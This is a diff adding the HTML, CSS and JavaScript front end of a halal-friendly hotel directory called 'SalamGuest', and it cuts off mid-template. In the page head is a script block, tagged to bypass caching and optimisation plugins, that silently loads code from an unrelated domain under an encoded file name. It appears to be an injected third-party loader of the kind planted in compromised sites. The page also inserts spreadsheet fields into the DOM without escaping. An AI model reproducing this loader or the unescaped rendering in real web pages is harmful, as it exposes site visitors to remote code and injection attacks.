@@ -1,0 +1,2309 @@
+<!DOCTYPE html>
+<html>
+<head>
+
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+
+<title>SalamGuest Directory</title>
+
+<link href="https://fonts.googleapis.com/css2?family=Libre+Bodoni:wght@700&family=Lexend:wght@400;500&display=swap" rel="stylesheet">
+
+<style>
+
+body{
+margin:0;
+font-family:Lexend,sans-serif;
+background:#fff;
+color:#222;
+overflow-x: hidden;
+}
+
+.container{
+display:flex;
+align-items:flex-start;
+gap:20px;
+padding:20px;
+max-width:1400px;
+margin:0 auto;
+box-sizing:border-box;
+}
+
+.sidebar{
+width:260px;
+flex-shrink:0;
+}
+
+/* =========================
+LOADING FILTERS
+========================= */
+
+#loadingFilters{
+font-family:"Libre Bodoni",serif;
+font-size:14px;
+letter-spacing:1.8px;
+text-transform:uppercase;
+color:#0042FD;
+margin-top: 20px;
+margin-bottom:30px;
+animation:softBlink 1.8s ease-in-out infinite;
+}
+
+@keyframes softBlink{
+0%{
+opacity:0.45;
+}
+50%{
+opacity:1;
+}
+100%{
+opacity:0.45;
+}
+}
+
+.filterTitle{
+font-size:14px;
+font-weight:500;
+margin-top:18px;
+margin-bottom:8px;
+color:#001A66;
+}
+
+.tag{
+display:inline-flex;
+align-items:center;
+justify-content:center;
+padding:8px 14px;
+margin:4px 4px 0 0;
+background:#f2f2f2;
+border-radius:999px;
+font-size:13px;
+cursor:pointer;
+transition:0.2s;
+text-align:center;
+color:#001A66;
+}
+
+.tag.active{
+background:#0042FD;
+color:#fff;
+}
+
+.main{
+flex:1;
+min-width:0;
+}
+
+/* SEARCH */
+
+.search{
+position:relative;
+}
+
+.search input{
+width:100%;
+padding:12px 52px 12px 14px;
+border-radius:12px;
+border:1px solid #dbe4ff;
+background:#eef3ff;
+font-family:Lexend;
+font-size:14px;
+box-sizing:border-box;
+box-shadow:inset 0 2px 6px rgba(0,0,0,0.08);
+outline:none;
+}
+
+.searchBtn{
+position:absolute;
+right:8px;
+top:50%;
+transform:translateY(-50%);
+width:36px;
+height:36px;
+border:none;
+background:#0042FD;
+border-radius:999px;
+display:flex;
+align-items:center;
+justify-content:center;
+cursor:pointer;
+padding:0;
+}
+
+.searchBtn svg{
+width:18px;
+height:18px;
+stroke:white;
+stroke-width:2.2;
+fill:none;
+}
+
+/* TOP BUTTONS */
+
+.topButtons{
+margin-top:10px;
+display:flex;
+gap:10px;
+flex-wrap:wrap;
+align-items:center;
+}
+
+.clearBtn{
+padding:8px 16px;
+border-radius:999px;
+border:2px solid #0042FD;
+background:white;
+color:#0042FD;
+cursor:pointer;
+font-family:Lexend;
+}
+
+.sortSelect{
+padding:8px 14px;
+border-radius:999px;
+border:1px solid #dbe4ff;
+background:#eef3ff;
+font-family:Lexend;
+font-size:13px;
+cursor:pointer;
+outline:none;
+color:#444;
+}
+
+.currencyTopBtn{
+padding:8px 14px;
+border-radius:999px;
+border:1px solid #dbe4ff;
+background:#eef3ff;
+font-family:Lexend;
+font-size:13px;
+cursor:pointer;
+color:#444;
+}
+
+/* GRID */
+
+.grid{
+display:grid;
+grid-template-columns:repeat(3,1fr);
+gap:22px;
+margin-top:20px;
+}
+
+/* CARD */
+
+.card{
+background:white;
+border-radius:16px;
+overflow:hidden;
+box-shadow:0 3px 10px rgba(0,0,0,0.14);
+display:flex;
+flex-direction:column;
+}
+
+/* CAROUSEL */
+
+.carouselWrap{
+position:relative;
+overflow:hidden;
+min-height:220px;
+background:#f5f5f5;
+}
+
+.carousel{
+display:flex;
+overflow-x:auto;
+scroll-snap-type:x mandatory;
+scroll-behavior:smooth;
+-ms-overflow-style:none;
+scrollbar-width:none;
+min-height:220px;
+}
+
+.carousel::-webkit-scrollbar{
+display:none;
+}
+
+.carousel img{
+width:100%;
+height:220px;
+object-fit:cover;
+flex-shrink:0;
+scroll-snap-align:start;
+}
+
+/* INDICATORS */
+
+.carouselIndicators{
+position:absolute;
+bottom:10px;
+left:50%;
+transform:translateX(-50%);
+display:flex;
+gap:5px;
+z-index:2;
+}
+
+.carouselIndicators{
+display:flex;
+justify-content:center;
+align-items:center;
+gap:8px;
+margin-top:10px;
+}
+
+.carouselIndicators span{
+width:28px;
+height:4px;
+border-radius:999px;
+background:#d8d8d8;
+transition:.25s;
+}
+
+.carouselIndicators span.active{
+width:42px;
+background:#0042FD;
+}
+
+
+/* CARD BODY */
+
+.cardBody{
+padding:16px;
+display:flex;
+flex-direction:column;
+flex-grow:1;
+}
+
+.title{
+font-family:"Libre Bodoni",serif;  
+color: #001A66;
+font-size:24px;
+line-height:1.2;
+margin-bottom:4px;
+}
+
+.location{
+font-size:13px;
+color:#666;
+margin-bottom:2px;
+}
+
+.description{
+font-size:13px;
+line-height:1.6;
+color:#444;
+white-space:pre-line;
+}
+
+/* PRICE */
+
+.priceWrap{
+margin-top:14px;
+display:flex;
+flex-direction:column;
+align-items:flex-start;
+}
+
+.priceLabel{
+font-family:"Libre Bodoni",serif;
+font-size:10px;
+letter-spacing:1.4px;
+color:#001A66;
+line-height:1;
+margin-bottom:8px;
+}
+
+.priceAmount{
+font-family:"Libre Bodoni",serif;
+font-size:26px;
+line-height:1;
+color:#001A66;
+}
+
+.priceCurrency{
+margin-top:8px;
+font-size:11px;
+color:#111;
+letter-spacing:0.3px;
+cursor:pointer;
+display:inline-block;
+border-bottom:1px dotted #111;
+width:fit-content;
+}
+
+/* RATING */
+
+.rating{
+margin-top:12px;
+font-size:14px;
+color:#0042FD;
+}
+
+.ratingSmall{
+font-size:10px;
+color:#777;
+margin-top:2px;
+}
+
+/* TAGS */
+
+.tagsRow{
+display:flex;
+flex-wrap:wrap;
+gap:6px;
+margin-top:12px;
+}
+
+.cardTag{
+display:inline-flex;
+align-items:center;
+justify-content:center;
+background:#eaf0ff;
+color:#0042FD;
+padding:8px 12px;
+border-radius:999px;
+font-size:11px;
+line-height:1.2;
+}
+
+/* BOOK */
+
+.book{
+display:block;
+margin-top:16px;
+padding:12px;
+text-align:center;
+background:#0042FD;
+color:white;
+text-decoration:none;
+border-radius:999px;
+border:2px solid #0042FD;
+transition:0.2s;
+}
+
+.book:hover{
+background:#f5f5f5;
+color:#0042FD;
+}
+
+/* RELATED LINKS */
+
+.relatedLinks{
+margin-top:12px;
+font-size:11px;
+line-height:1.8;
+letter-spacing:0.4px;
+}
+
+.relatedLinks a{
+color:#324a7d;
+text-decoration:underline;
+margin-right:10px;
+}
+
+.relatedLinks a:hover{
+color:#0042FD;
+}
+
+.bottom{
+margin-top:auto;
+}
+
+.bottomNav{
+display:flex;
+justify-content:space-between;
+align-items:center;
+margin-top:24px;
+}
+
+.pageBtn{
+padding:7px 12px;
+margin:2px;
+border:1px solid #0042FD;
+background:white;
+color:#0042FD;
+cursor:pointer;
+border-radius:8px;
+}
+
+.pageBtn.active{
+background:#0042FD;
+color:white;
+}
+
+#noResults{
+display:none;
+text-align:center;
+margin-top:40px;
+font-size:14px;
+color:#666;
+}
+
+.currencyOption{
+padding:10px 12px;
+cursor:pointer;
+border-radius:8px;
+font-size:13px;
+}
+
+.currencyOption:hover{
+background:#eef3ff;
+}
+
+#currencyModal{
+display:none;
+position:fixed;
+inset:0;
+background:rgba(0,0,0,0.45);
+z-index:99999;
+align-items:center;
+justify-content:center;
+}
+
+.currencyBox{
+background:white;
+padding:20px;
+border-radius:18px;
+width:240px;
+}
+
+#redirectOverlay{
+position:fixed;
+inset:0;
+background:rgba(0,0,0,0.45);
+display:none;
+align-items:center;
+justify-content:center;
+z-index:99999;
+}
+
+.redirectBox{
+background:white;
+padding:24px;
+border-radius:18px;
+text-align:center;
+width:240px;
+box-shadow:0 10px 40px rgba(0,0,0,0.15);
+}
+
+.spinner{
+width:32px;
+height:32px;
+border:3px solid #ddd;
+border-top-color:#0042FD;
+border-radius:50%;
+margin:0 auto 16px;
+animation:spin 1s linear infinite;
+}
+
+@keyframes spin{
+to{
+transform:rotate(360deg);
+}
+}
+
+@media(max-width:900px){
+
+.container{
+flex-direction:column;
+padding:12px;
+}
+
+.sidebar{
+width:100%;
+}
+
+.grid{
+grid-template-columns:1fr;
+}
+
+.topButtons{
+flex-direction:column;
+align-items:stretch;
+}
+
+.clearBtn,
+.sortSelect,
+.currencyTopBtn{
+width:100%;
+text-align:center;
+}
+
+.sortSelect{
+text-align:center;
+text-align-last:center;
+}
+
+.currencyTopBtn{
+display:flex;
+justify-content:center;
+align-items:center;
+}
+
+}
+
+/* =========================
+LOCKED FILTER CHIPS (UPDATED)
+========================= */
+
+.locked-chip {
+  display:inline-flex;
+align-items:center;
+justify-content:center;
+
+padding:9px 14px;
+border-radius:999px;
+
+background:#EEF1F7;
+color:#b2bad1;
+
+font-family:Lexend,sans-serif;
+font-size:13px;
+font-weight:500;
+
+cursor:pointer;
+transition:0.2s ease;
+
+opacity:0.82;
+}
+
+.locked-chip:hover{
+opacity:1;
+transform:translateY(-1px);
+}
+
+/* blurred text ONLY */
+.locked-chip span {
+  filter: blur(0.5px);
+} 
+
+/* =========================
+FLAT LOCK ICON (FIXED - NO HANDBAG LOOK
+========================= */
+.lock-icon {
+  width: 10px;
+  height: 10px;
+  background: #8c8c8c;
+  border-radius: 2px;
+  display: none;
+  flex-shrink: 0;
+}
+
+/* top shackle (closed lock look) */
+.lock-icon::before {
+  content: "";
+  position: absolute;
+  width: 8px;
+  height: 6px;
+  border: 2px solid #8c8c8c;
+  border-bottom: none;
+  border-radius: 6px 6px 0 0;
+  top: -7px;
+  left: 1px;
+}
+
+/* =========================
+LOCKED GRID (spacing fix only)
+========================= */
+.locked-grid{
+display:flex;
+flex-wrap:wrap;
+gap:8px;
+margin-top:10px;
+margin-bottom:6px;
+}
+
+/* =========================
+MOBILE SPACING IMPROVEMENT
+========================= */
+@media (max-width: 768px) {
+  .locked-grid {
+    margin-bottom: 24px;
+  }
+}
+
+/* =========================
+PREMIUM TOOLTIP
+========================= */
+
+
+.premiumPopup{
+position:fixed;
+display:none;
+background:white;
+border-radius:18px;
+padding:18px;
+width:260px;
+max-width:calc(100vw - 28px);
+box-sizing:border-box;
+box-shadow:0 10px 40px rgba(0,0,0,0.14);
+z-index:999999;
+border:1px solid #eef3ff;
+}
+
+.premiumTitle{
+font-family:"Libre Bodoni",serif;
+font-size:18px;
+margin-bottom:8px;
+color:#111;
+}
+
+.premiumText{
+font-size:13px;
+line-height:1.6;
+color:#555;
+margin-bottom:14px;
+}
+
+.premiumBtn{
+display:block;
+width:100%;
+padding:12px;
+border:none;
+border-radius:999px;
+background:#0042FD;
+color:white;
+font-family:Lexend;
+cursor:pointer;
+font-size:13px;
+}
+
+.closeMini{
+position:absolute;
+top:10px;
+right:12px;
+cursor:pointer;
+font-size:16px;
+color:#999;
+}
+
+
+/* IMAGE LABEL */
+
+.imageLabel{
+position:absolute;
+top:12px;
+left:12px;
+z-index:5;
+padding:6px 10px;
+border-radius:999px;
+font-family: Lexend, sans-serif;
+font-size:7px;
+font-weight:normal;
+letter-spacing:.1px;
+text-transform:uppercase;
+background:rgba(255,255,255,.82);
+backdrop-filter:blur(10px);
+color:#909090;
+box-shadow: 0 2px 10px rgba(0,0,0,.08);
+}
+
+
+
+/* =========================
+BOTTOM FILTER STICKY BAR
+========================= */
+
+#bottomFilterBar{
+
+display:none;
+
+align-items:center;
+justify-content:space-between;
+gap:10px;
+
+margin-bottom:18px;
+
+}
+
+@media(min-width:901px){
+
+#bottomFilterBar{
+display:none !important;
+}
+
+}
+
+
+#filterCount{
+
+flex:1;
+
+background:#F5F6F8;
+
+padding:12px 16px;
+
+border-radius:14px;
+
+font-size:13px;
+font-weight:500;
+
+text-align:center;
+
+cursor:pointer;
+touch-action:manipulation;
+}
+
+#floatingSearchBtn{
+
+background:#697CA5;
+color:white;
+
+padding:12px 18px;
+
+border-radius:14px;
+
+display:flex;
+align-items:center;
+justify-content:center;
+
+font-size:13px;
+font-weight:600;
+
+cursor:pointer;
+
+white-space:nowrap;
+}
+
+/* SAME SEARCH ICON */
+#floatingSearchBtn
+.searchIcon{
+
+border-color:white;
+
+}
+
+#floatingSearchBtn
+.searchIcon::after{
+
+background:white;
+
+}
+
+html, body{
+  height: 100%;
+  margin: 0;
+  padding: 0;
+}
+
+body{
+overflow-x:hidden;
+position:relative;
+padding-bottom:120px;
+}
+
+/* SEARCH POPUP */
+
+#searchOverlay{
+
+position:fixed;
+
+inset:0;
+
+display:none;
+justify-content:center;
+align-items:center;
+
+background:
+rgba(255,255,255,.74);
+
+backdrop-filter:
+blur(3px);
+
+z-index:999999;
+
+-webkit-backdrop-filter:
+blur(3px);
+
+}
+
+.searchPopup{
+background:white;
+padding:20px 28px;
+border-radius:20px;
+box-shadow:0 6px 24px rgba(0,0,0,0.08);
+font-family:Lexend,sans-serif;
+font-size:15px;
+letter-spacing:.4px;
+color:#697CA5;
+text-align:center;
+}
+
+
+</style>
+
+
+<script nowprocket data-noptimize="1" data-cfasync="false" data-wpfc-render="false" seraph-accel-crit="1" data-no-defer="1">
+  (function () {
+      var script = document.createElement("script");
+      script.async = 1;
+      script.src = 'https://emrld.ltd/NTMzNDI3.js?t=533427';
+      document.head.appendChild(script);
+  })();
+</script>
+
+</head>
+
+<body> 
+
+<div class="container">
+
+<div class="sidebar">
+
+<!-- MOBILE FILTER ACTION BAR -->
+
+<div id="bottomFilterBar">
+
+<div
+id="filterCount"
+onclick="scrollToFilters()">
+
+⌂ FILTERS • 0 SELECTED
+
+</div>
+
+<div
+id="floatingSearchBtn"
+onclick="runStickySearch()">
+
+SEARCH
+
+</div>
+
+</div>
+
+<div id="loadingFilters">
+LOADING FILTERS
+</div>
+
+<div id="filters"></div>
+
+<!-- LOCKED FILTER PREVIEW BOTTOM OF FILTER BAR -->
+<div class="locked-grid" style="display:none;">
+
+  <div class="locked-chip" onclick="openPremiumPopup(event)">
+    <span>Halal Certified</span>
+    <div class="lock-icon"></div>
+  </div>
+
+  <div class="locked-chip" onclick="openPremiumPopup(event)">
+    <span>Mini Fridge Provided</span>
+    <div class="lock-icon"></div>
+  </div>
+
+  <div class="locked-chip" onclick="openPremiumPopup(event)">
+    <span>Prayer Room Nearby</span>
+    <div class="lock-icon"></div>
+  </div>
+
+  <div class="locked-chip" onclick="openPremiumPopup(event)">
+    <span>Family Friendly</span>
+    <div class="lock-icon"></div>
+  </div>
+
+  <div class="locked-chip" onclick="openPremiumPopup(event)">
+    <span>Nearby Mosque</span>
+    <div class="lock-icon"></div>
+  </div>
+
+  <div class="locked-chip" onclick="openPremiumPopup(event)">
+    <span>Quiet Stay</span>
+    <div class="lock-icon"></div>
+  </div>
+
+  <div class="locked-chip" onclick="openPremiumPopup(event)">
+    <span>Luxury Muslim Stay</span>
+    <div class="lock-icon"></div>
+  </div>
+
+  <div class="locked-chip" onclick="openPremiumPopup(event)">
+    <span>Transit Friendly</span>
+    <div class="lock-icon"></div>
+  </div>
+
+</div>
+
+</div>
+
+
+
+<div class="main">
+
+
+
+<div class="search">
+
+<input id="searchInput"
+placeholder="Search hotel, stay or any keyword">
+
+<button class="searchBtn"
+onclick="runStickySearch()">
+
+<svg viewBox="0 0 24 24">
+<circle cx="11" cy="11" r="7"></circle>
+<line x1="16.65" y1="16.65" x2="21" y2="21"></line>
+</svg>
+
+</button>
+
+</div>
+
+<div class="topButtons">
+
+<button class="clearBtn" onclick="clearAll()">
+Clear
+</button>
+
+<select id="sortSelect"
+class="sortSelect"
+onchange="render()">
+
+<option value="default">Sort</option>
+<option value="lowHigh">Price: Low to High</option>
+<option value="highLow">Price: High to Low</option>
+<option value="ratingHigh">Highest Rated</option>
+<option value="ratingLow">Lowest Rated</option>
+
+</select>
+
+<button class="currencyTopBtn"
+onclick="openCurrencyPopup(event)">
+MYR ▼
+</button>
+
+</div>
+
+<div id="noResults">
+No results found. Please try a different search.
+</div>
+
+<div class="grid" id="cards"></div>
+
+<div class="bottomNav">
+
+<button onclick="scrollTopSmooth()" style="
+cursor:pointer;
+color:#0042FD;
+font-size:14px;
+background:none;
+border:none;
+padding:0;
+font-family:Lexend,sans-serif;
+">
+Back To Top
+</button>
+
+<div id="pagination"></div>
+
+</div>
+
+</div>
+</div>
+
+<!-- CURRENCY MODAL -->
+
+
+
+<!-- REDIRECT -->
+
+<div id="redirectOverlay">
+
+<div class="redirectBox">
+
+<div class="spinner"></div>
+
+<div style="font-size:14px;">
+Redirecting to booking partner...
+</div>
+
+</div>
+
+</div>
+
+
+  <div id="premiumPopup" class="premiumPopup">
+
+<div class="closeMini"
+onclick="closePremiumPopup()">
+✕
+</div>
+
+<div class="premiumTitle">
+Unlock Premium Filters
+</div>
+
+<div class="premiumText">
+Discover full filters including prayer access, bidets, halal dining, female-friendly spaces, private pools and more.
+</div>
+
+<button class="premiumBtn">
+Coming Soon
+</button>
+
+</div>
+
+
+<div id="currencyPopup"
+class="premiumPopup">
+
+<div class="closeMini"
+onclick="closeCurrencyPopup()">
+✕
+</div>
+
+<div class="premiumTitle">
+Choose Currency
+</div>
+
+<div class="currencyOption"
+onclick="setCurrency('MYR')">
+MYR
+</div>
+
+<div class="currencyOption"
+onclick="setCurrency('USD')">
+USD
+</div>
+
+<div class="currencyOption"
+onclick="setCurrency('SGD')">
+SGD
+</div>
+
+<div class="currencyOption"
+onclick="setCurrency('GBP')">
+GBP
+</div>
+
+<div class="currencyOption"
+onclick="setCurrency('EUR')">
+EUR
+</div>
+
+<div class="currencyOption"
+onclick="setCurrency('JPY')">
+JPY
+</div>
+
+<div class="currencyOption"
+onclick="setCurrency('SAR')">
+SAR
+</div>
+
+<div class="currencyOption"
+onclick="setCurrency('AED')">
+AED
+</div>
+
+</div>
+
+
+
+<script>
+
+const SHEET_URL="https://docs.google.com/spreadsheets/d/e/2PACX-1vSYw1Ah01StvD_FKZvGw7M_pxB8_mxLhYDwE9rT7PEmK5n7VS7mxIi0FQZ1BezpycxRhOaXzrpwyRHU/pub?gid=0&single=true&output=csv";
+
+const MAX_ITEMS=20;
+const ITEMS_PER_PAGE=12;
+
+let data=[];
+let activeFilters=[];
+let currentPage=1;
+let currentCurrency="MYR";
+
+let exchangeRates={
+MYR:1
+};
+
+/* EXCHANGE RATES */
+
+async function loadRates(){
+
+try{
+
+const res=await fetch("https://api.exchangerate.host/latest?base=MYR");
+
+const json=await res.json();
+
+exchangeRates={
+MYR:1,
+USD:json.rates.USD,
+SGD:json.rates.SGD,
+GBP:json.rates.GBP,
+EUR:json.rates.EUR,
+JPY:json.rates.JPY,
+SAR:json.rates.SAR,
+AED:json.rates.AED,
+IDR:json.rates.IDR,
+TRY:json.rates.TRY
+};
+
+}catch(err){
+
+exchangeRates={
+MYR:1,
+USD:0.21,
+SGD:0.30,
+GBP:0.16,
+EUR:0.19,
+JPY:30,
+SAR:0.79,
+AED:0.77,
+IDR:3300,
+TRY:6.5
+};
+
+}
+
+}
+
+/* PRICE */
+
+function formatPrice(price){
+
+let num=parseFloat(price)||0;
+
+let converted=num*exchangeRates[currentCurrency];
+
+return converted.toFixed(2);
+
+}
+
+/* CURRENCY */
+
+
+function openCurrencyPopup(event){
+
+const popup =
+document.getElementById("currencyPopup");
+
+popup.style.display = "block";
+
+popup.style.position = "absolute";
+
+const popupWidth = 260;
+const padding = 14;
+const screenWidth = window.innerWidth;
+
+let x = event.pageX;
+let y = event.pageY;
+
+let left = x;
+let top = y + 10;
+
+if(left + popupWidth > screenWidth){
+
+left =
+screenWidth - popupWidth - padding;
+
+}
+
+if(left < padding){
+
+left = padding;
+
+}
+
+popup.style.left = left + "px";
+popup.style.top = top + "px";
+
+}
+
+function closeCurrencyPopup(){
+
+document.getElementById("currencyPopup")
+.style.display = "none";
+
+}
+
+
+function setCurrency(currency){
+
+currentCurrency=currency;
+
+document.querySelector(".currencyTopBtn").innerHTML=
+currency+" ▼";
+
+closeCurrencyPopup();
+
+render();
+
+}
+
+/* CSV */
+
+function parseCSV(text){
+
+const rows = [];
+let row = [];
+let current = "";
+let inQuotes = false;
+
+for(let i = 0; i < text.length; i++){
+
+const char = text[i];
+const next = text[i + 1];
+
+if(char === '"'){
+
+if(inQuotes && next === '"'){
+current += '"';
+i++;
+}else{
+inQuotes = !inQuotes;
+}
+
+}else if(char === "," && !inQuotes){
+
+row.push(current);
+current = "";
+
+}else if((char === "\n" || char === "\r") && !inQuotes){
+
+if(current || row.length){
+row.push(current);
+rows.push(row);
+row = [];
+current = "";
+}
+
+}else{
+
+current += char;
+
+}
+
+}
+
+if(current || row.length){
+row.push(current);
+rows.push(row);
+}
+
+const headers = rows[0].map(h => h.trim());
+
+return rows.slice(1).map(cols => {
+
+let obj = {};
+
+headers.forEach((h,i)=>{
+obj[h] = (cols[i] || "").trim();
+});
+
+return obj;
+
+});
+
+}
+
+/* LOAD */
+
+async function load(){
+
+await loadRates();
+
+const res=await fetch(SHEET_URL);
+
+const text=await res.text();
+
+data=parseCSV(text);
+
+buildFilters();
+
+applyURLFilters();
+
+}
+
+/* FILTERS */
+
+function buildFilters(){
+
+const groups={};
+
+data.forEach(item=>{
+
+(item.filter_tags||"").split(",").forEach(tag=>{
+
+if(tag.toLowerCase().includes("view:")) return;
+
+let [cat,val]=tag.split(":");
+
+if(!cat||!val)return;
+
+if(!groups[cat])groups[cat]=new Set();
+
+groups[cat].add(val.trim());
+
+});
+
+});
+
+const order=[
+"Property Type",
+"Meals",
+"Facilities",
+"Transport",
+"Retail",
+"Leisure",
+"Convenience",
+"Female Only"
+];
+
+const container=document.getElementById("filters");
+
+document.getElementById("loadingFilters").style.display="none";
+
+document.getElementById("loadingFilters").style.display="none";
+
+order.forEach(cat=>{
+
+if(!groups[cat])return;
+
+let block=document.createElement("div");
+
+block.innerHTML=`<div class="filterTitle">${cat}</div>`;
+
+groups[cat].forEach(val=>{
+
+let el=document.createElement("div");
+
+el.className="tag";
+
+el.innerText=val;
+
+el.onclick=(event)=>{
+
+event.preventDefault();
+event.stopPropagation();
+
+toggle(cat+":"+val,el);
+
+};
+
+block.appendChild(el);
+
+});
+
+/* MANUAL LOCKED CHIPS */
+
+const premiumRow = document.createElement("div");
+
+premiumRow.className = "locked-grid";
+
+/* CATEGORY: MEALS */
+
+if(cat === "Meals"){
+
+premiumRow.innerHTML = `
+
+<div class="locked-chip"
+onclick="openPremiumPopup(event)">
+<span>Halal Dinner</span>
+<div class="lock-icon"></div>
+</div>
+
+<div class="locked-chip"
+onclick="openPremiumPopup(event)">
+<span>Halal Snacks</span>
+<div class="lock-icon"></div>
+</div>
+
+<div class="locked-chip"
+onclick="openPremiumPopup(event)">
+<span>Halal Certified Room Service</span>
+<div class="lock-icon"></div>
+</div>
+
+`;
+
+}
+
+/* CATEGORY: FACILITIES */
+
+if(cat === "Facilities"){
+
+premiumRow.innerHTML = `
+
+<div class="locked-chip"
+onclick="openPremiumPopup(event)">
+<span>Designated Smoking Spaces</span>
+<div class="lock-icon"></div>
+</div>
+
+<div class="locked-chip"
+onclick="openPremiumPopup(event)">
+<span>Air Conditioning</span>
+<div class="lock-icon"></div>
+</div>
+
+<div class="locked-chip"
+onclick="openPremiumPopup(event)">
+<span>Ceiling Fan</span>
+<div class="lock-icon"></div>
+</div>
+
+<div class="locked-chip"
+onclick="openPremiumPopup(event)">
+<span>Complimentary High Speed Wi-Fi</span>
+<div class="lock-icon"></div>
+</div>
+
+<div class="locked-chip"
+onclick="openPremiumPopup(event)">
+<span>TV With Entertainment Channels </span>
+<div class="lock-icon"></div>
+</div>
+
+<div class="locked-chip"
+onclick="openPremiumPopup(event)">
+<span>Mini Fridge Provided</span>
+<div class="lock-icon"></div>
+</div>
+
+<div class="locked-chip"
+onclick="openPremiumPopup(event)">
+<span>Bathrobes And Slippers Provided</span>
+<div class="lock-icon"></div>
+</div>
+
+<div class="locked-chip"
+onclick="openPremiumPopup(event)">
+<span>Coffee And Tea Making Facilities</span>
+<div class="lock-icon"></div>
+</div>
+
+<div class="locked-chip"
+onclick="openPremiumPopup(event)">
+<span>Electric Kettle Available</span>
+<div class="lock-icon"></div>
+</div>
+
+
+`;
+
+}
+
+/* CATEGORY: TRANSPORT */
+
+if(cat === "Transport"){
+
+premiumRow.innerHTML = `
+
+<div class="locked-chip"
+onclick="openPremiumPopup(event)">
+<span>On Demand Transport</span>
+<div class="lock-icon"></div>
+</div>
+
+<div class="locked-chip"
+onclick="openPremiumPopup(event)">
+<span>Complimentary Parking For Guests</span>
+<div class="lock-icon"></div>
+</div>
+
+<div class="locked-chip"
+onclick="openPremiumPopup(event)">
+<span>Complimentary Valet Parking For Guests</span>
+<div class="lock-icon"></div>
+</div>
+
+`;
+
+}
+
+/* CATEGORY: FEMALE ONLY */
+
+if(cat === "Female Only"){
+
+premiumRow.innerHTML = `
+
+<div class="locked-chip"
+onclick="openPremiumPopup(event)">
+<span>Female Only Spa Room</span>
+<div class="lock-icon"></div>
+</div>
+
+<div class="locked-chip"
+onclick="openPremiumPopup(event)">
+<span>Female Only Changing Facilities</span>
+<div class="lock-icon"></div>
+</div>
+
+<div class="locked-chip"
+onclick="openPremiumPopup(event)">
+<span>Female Only Gym</span>
+<div class="lock-icon"></div>
+</div>
+
+`;
+
+}
+
+/* only append if category has chips */
+
+if(premiumRow.innerHTML.trim() !== ""){
+block.appendChild(premiumRow);
+}
+
+container.appendChild(block);
+
+});
+
+}
+
+/* TOGGLE */
+
+function toggle(tag,el){
+
+if(activeFilters.includes(tag)){
+
+activeFilters =
+activeFilters.filter(t => t !== tag);
+
+el.classList.remove("active");
+
+}else{
+
+activeFilters.push(tag);
+
+el.classList.add("active");
+
+}
+
+currentPage = 1;
+
+/* refresh UI */
+updateStickyBar();
+
+/* helps mobile browsers repaint */
+requestAnimationFrame(()=>{
+
+render();
+
+/* force iframe resize again */
+setTimeout(sendHeight,300);
+
+});
+
+}
+
+/* CLEAR */
+
+function clearAll(){
+
+activeFilters=[];
+
+currentPage=1;
+
+document.querySelectorAll(".tag").forEach(t=>{
+t.classList.remove("active");
+});
+
+document.getElementById("searchInput").value="";
+
+document.getElementById("sortSelect").value="default";
+
+/* sync sticky bar */
+updateStickyBar();
+
+render();
+
+}
+
+/* SCROLL */
+
+/* SCROLL TO FILTERS */
+
+function scrollToFilters(){
+
+document
+.getElementById("filters")
+.scrollIntoView({
+behavior:"smooth",
+block:"start"
+});
+
+}
+
+/* REDIRECT */
+
+function redirectBooking(url){
+
+document.getElementById("redirectOverlay")
+.style.display="flex";
+
+setTimeout(()=>{
+
+window.open(url,"_blank");
+
+document.getElementById("redirectOverlay")
+.style.display="none";
+
+},900);
+
+}
+
+/* RENDER */
+
+function render(){
+
+const search=document.getElementById("searchInput")
+.value.toLowerCase();
+
+let filtered=data.filter(item=>{
+
+let tags=(item.filter_tags||"").toLowerCase();
+
+let isBasic=tags.includes("view: basic");
+
+let matchFilters=activeFilters.every(f=>
+tags.includes(f.toLowerCase())
+);
+
+let fullSearchText = `
+${item.name || ""}
+${item.description || ""}
+${item.city || ""}
+${item.country || ""}
+${item.filter_tags || ""}
+${item.card_tags || ""}
+${item.location || ""}
+`.toLowerCase();
+
+let searchMatch = fullSearchText.includes(search);
+
+return isBasic && matchFilters && searchMatch;
+
+});
+
+/* SORT */
+
+const sort=document.getElementById("sortSelect")?.value || "default";
+
+if(sort==="lowHigh"){
+
+filtered.sort((a,b)=>
+(parseFloat(a.price)||0)
+-
+(parseFloat(b.price)||0)
+);
+
+}
+
+if(sort==="highLow"){
+
+filtered.sort((a,b)=>
+(parseFloat(b.price)||0)
+-
+(parseFloat(a.price)||0)
+);
+
+}
+
+if(sort==="ratingHigh"){
+
+filtered.sort((a,b)=>
+(parseFloat(b.rating)||0)
+-
+(parseFloat(a.rating)||0)
+);
+
+}
+
+if(sort==="ratingLow"){
+
+filtered.sort((a,b)=>
+(parseFloat(a.rating)||0)
+-
+(parseFloat(b.rating)||0)
+);
+
+}
+
+if(filtered.length===0){
+
+document.getElementById("noResults")
+.style.display="block";
+
+}else{
+
+document.getElementById("noResults")
+.style.display="none";
+
+}
+
+filtered=filtered.slice(0,MAX_ITEMS);
+
+const start=(currentPage-1)*ITEMS_PER_PAGE;
+
+const pageData=filtered.slice(start,start+ITEMS_PER_PAGE);
+
+const cards=document.getElementById("cards");
+
+cards.innerHTML=pageData.map(item=>{
+
+const folder = (item.media || "").trim();
+
+let mediaContent = "";
+
+if(folder){
+
+for(let i = 1; i <= 10; i++){
+
+mediaContent += `
+<img
+src="https://salamguest.github.io/salamguest-directory/images/${folder}/${i}.jpg"
+onerror="this.style.display='none'"
+onload="this.dataset.loaded='true'"
+>
+`;
+
+}
+
+}else{
+
+mediaContent = `
+<img
+src="https://salamguest.github.io/salamguest-directory/images/placeholder.jpg"
+>
+`;
+
+}
+
+return `
+
+<div class="card">
+
+<div class="carouselWrap">
+
+${item.image_label &&
+item.image_label.trim() !== "-" ? `
+<div class="imageLabel">
+${item.image_label}
+</div>
+` : ""}
+
+<div class="carousel">
+${mediaContent}
+</div>
+
+<div class="carouselIndicators"></div>
+
+</div>
+
+<div class="cardBody">
+
+<div class="title">
+${item.name}
+</div>
+
+<div class="location">
+${item.city}, ${item.country}
+</div>
+
+<div class="description">
+${item.description}
+</div>
+
+<div class="bottom">
+
+<div class="priceWrap">
+
+<div class="priceLabel">
+ESTIMATED STARTING FROM 
+</div>
+
+
+
+<div class="priceAmount">
+${formatPrice(item.price)}
+</div>
+
+<div class="priceCurrency"
+onclick="openCurrencyPopup(event)">
+${currentCurrency} / night
+</div>
+
+</div>
+
+<div class="rating">
+${item.rating} / 5
+<div class="ratingSmall">
+Average Guest Rating <br/>
+Based On Public Reviews
+</div>
+</div>
+
+<div class="tagsRow">
+
+${(item.card_tags||"")
+.split(",")
+.filter(tag=>tag.trim()!=="")
+.map(tag=>`
